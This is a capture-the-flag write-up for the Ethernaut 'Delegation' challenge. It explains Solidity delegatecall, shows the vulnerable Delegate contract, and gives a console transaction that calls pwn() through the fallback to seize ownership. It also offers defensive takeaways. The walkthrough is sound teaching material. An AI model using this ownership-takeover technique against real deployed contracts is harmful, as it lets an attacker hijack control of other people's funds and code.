# Ethernaut Level 6: Delegation Challenge Explained

## What is Delegatecall?

Delegatecall is a low-level function call in Ethereum that allows a contract to invoke functions from another contract while preserving its own context. This means that the calling contract's storage and its `msg.sender`, `msg.value` attributes remain the same even when a function from another contract is invoked.

```solidity
contract A {
    function callDelegate(address delegateAddress, bytes memory data) public {
        delegateAddress.delegatecall(data);
    }
}
```

## How does Delegatecall work?

When Contract A makes a delegatecall to Contract B, it allows Contract B to mutate its storage. This can lead to unintended consequences if Contract B is malicious or if the storage context is unsafe.

```solidity
contract B {
    uint public storageValue;

    function setStorageValue(uint newValue) public {
        storageValue = newValue;
    }
}
```

## The Challenge

In this challenge, you are required to claim ownership of the given instance. The Delegation contract makes a delegatecall to the Delegate contract. The Delegate contract has a function called `pwn()`, which changes the ownership of an `owner` variable to whoever invoked the function. Your task is to invoke this function and become the owner of the contract.

```solidity
contract Delegate {
    address public owner; // Occupies slot 0

    function pwn() public {
        owner = msg.sender; // Save msg.sender to slot 0
    }
}
```

## How to solve the challenge?

You can invoke the `pwn()` function by sending data in a transaction. This can be done using the Remix IDE or the console. Once you successfully invoke the function, you become the owner of the contract.

```solidity
// Invoke Delegation.sol’s fallback function
await sendTransaction({
    from: "0x1733d5adaccbe8057dba822ea74806361d181654",
    to: "0xe3895c413b0035512c029878d1ce4d8702d02320",
    data: "0xdd365b8b0000000000000000000000000000000000000000000000000000000000000000"
});
```

## Key Takeaways

It's important to use the higher-level `call()` function when inheriting from libraries, especially when you don't need to change contract storage and do not care about gas control. Also, when inheriting from a library intending to alter your contract’s storage, make sure to line up your storage slots with the library’s storage slots to avoid these edge cases. Always authenticate and do conditional checks on functions that invoke delegatecalls.

This challenge is a great way to understand the potential vulnerabilities associated with delegatecalls, which was a core issue in the $30M Parity hack.
